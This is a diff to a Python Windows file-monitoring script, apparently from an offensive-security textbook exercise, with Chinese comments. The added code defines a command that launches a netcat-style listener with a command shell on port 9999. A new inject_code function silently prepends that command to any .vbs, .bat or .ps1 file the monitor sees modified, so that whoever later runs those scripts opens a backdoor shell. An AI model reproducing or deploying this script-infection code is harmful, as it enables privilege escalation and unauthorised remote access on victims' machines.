@@ -17,6 +17,32 @@ FILE_DELETED        = 2
 FILE_MODIFIED       = 3
 FILE_RENAMED_FROM   = 4
 FILE_RENAMED_TO     = 5
+file_types          = {}
+
+command = "C:\\WINDOWS\\TEMP\\bhpnet.exe -l -p 9999 -c"
+file_types['.vbs'] = ["\r\n'bhpmarker\r\n","\r\nCreateObject(\"Wscript.Shell\").Run(\"%s\")\r\n" % command]
+
+file_types['.bat'] = ["\r\nREM bhpmarker\r\n","\r\n%s\r\n" % command]
+
+file_types['.ps1'] = ["\r\n#bhpmarker","Start-Process \"%s\"\r\n" % command]
+
+#用于执行代码插入的函数
+def inject_code(full_filename,extension,contents):
+    #判断文件是否存在标记
+    if file_types[extension][0] in contents:
+        return
+
+    #如果没有标记的话，那么插入代码并标记
+    full_contents   = file_types[extension][0]
+    full_contents  += file_types[extension][1]
+    full_contents  += contents
+
+    with open(full_filename,"wb") as fd:
+        fd.write(full_contents)
+
+    print("[\o/'] Injected code.")
+
+    return
 
 def start_monitor(path_to_watch):
     #为每个监控器起一个线程
@@ -70,6 +96,13 @@ def start_monitor(path_to_watch):
                     except Exception as e:
                         print("[!!!] Failed.")
                         print(e)
+
+#### 新代码开始的地方
+                    filename,extension = os.path.splitext(full_filename)
+
+                    if extension in file_types:
+                        inject_code(full_filename,extension,contents)
+#### 新代码结束
 
                 elif action == FILE_RENAME_FROM:
                     print("[ > ] Renamed from: %s" % full_filename)
